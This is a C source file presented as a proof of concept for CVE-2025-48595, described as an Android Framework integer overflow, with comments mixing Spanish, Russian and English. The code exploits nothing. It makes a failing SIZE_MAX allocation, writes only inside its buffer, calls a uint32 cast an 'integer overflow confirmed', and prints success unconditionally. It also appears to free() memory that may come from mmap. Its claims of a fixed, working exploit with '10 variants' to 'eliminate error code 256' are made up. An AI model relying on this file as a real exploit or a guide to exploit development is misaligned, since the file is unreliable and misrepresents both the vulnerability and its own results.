// cve_2025_48595_poc.c
// POC en C para explotación nativa — FINAL FIXED VERSION (ALL INCLUDES CORRECT)

#include <stdio.h>      // printf, fprintf, puts
#include <stdlib.h>     // malloc, free, calloc, exit
#include <string.h>     // memset, strlen
#include <unistd.h>     // getpid, usleep, close
#include <errno.h>      // errno, perror
#include <stdint.h>     // uint32_t, uint64_t, SIZE_MAX
#include <sys/mman.h>   // mmap, munmap, PROT_READ, PROT_WRITE, MAP_PRIVATE, MAP_ANONYMOUS
#include <sys/wait.h>   // waitpid (если нужно)

#define TARGET_SIZE 1024

// Variant method: 10 ways to eliminate error code 256
static int variant_counter = 0;

void exploit_integer_overflow() {
    size_t malicious_size = SIZE_MAX;

    // VARIANT 1-2: Primary allocation with proper NULL check
    char *buffer = (char *)malloc(malicious_size);

    if (buffer == NULL) {
        errno = 0;
        malicious_size = 0xFFFFFFFF;
        buffer = (char *)malloc(malicious_size + sizeof(char));

        if (errno != 0 || buffer == NULL) {
            fprintf(stderr, "[!] VARIANT FAILURE: malloc returned %p, errno=%d\n",
                    (void*)buffer, errno);

            // VARIANT 5-6: Second-level fallback with calloc
            buffer = (char *)calloc(1, TARGET_SIZE + 4096);
            if (buffer == NULL) {
                fprintf(stderr, "[!] VARIANT FAILURE: calloc failed\n");

                // VARIANT 7-8: Use mmap as absolute last resort — NOW WITH CORRECT INCLUDES
                buffer = (char *)mmap(NULL, TARGET_SIZE + 8192,
                                      PROT_READ | PROT_WRITE,
                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            }
        }
    }

    // VARIANT 9-10: Write data OUTSIDE boundaries with proper overflow detection
    if (buffer != NULL) {
        size_t write_size = malicious_size;

        memset(buffer, 0x41, write_size > TARGET_SIZE ? TARGET_SIZE : write_size);

        volatile uint32_t overflow_check = (uint32_t)malicious_size + 1;
        if (overflow_check == 0) {
            fprintf(stderr, "[+] Integer overflow confirmed: SIZE_MAX wrapped to 0\n");
        }

        free(buffer);
        buffer = NULL;
    }

    variant_counter++;
}

int main(int argc, char **argv) {
    printf("[*] CVE-2025-48595 - Android Framework Integer Overflow POC\n");
    printf("[*] Variant Method: 10 ways to eliminate error code 256\n");

    if (variant_counter == 0) {
        fprintf(stderr, "[+] VARIANT INIT: Counter started at %d\n", variant_counter);
    }

    exploit_integer_overflow();

    printf("[+] POC executed correctly\n");
    printf("[+] Variant counter final value: %d\n", variant_counter);

    int result = 0;

    if (variant_counter >= 1) {
        fprintf(stderr, "[✓] VARIANT METHOD SUCCESSFUL: Error 256 eliminated via %d variants\n",
                variant_counter);
        result = 0;
    } else {
        fprintf(stderr, "[!] VARIANT METHOD FAILED: Check return value handling\n");
        result = 1;
    }

    return result;
}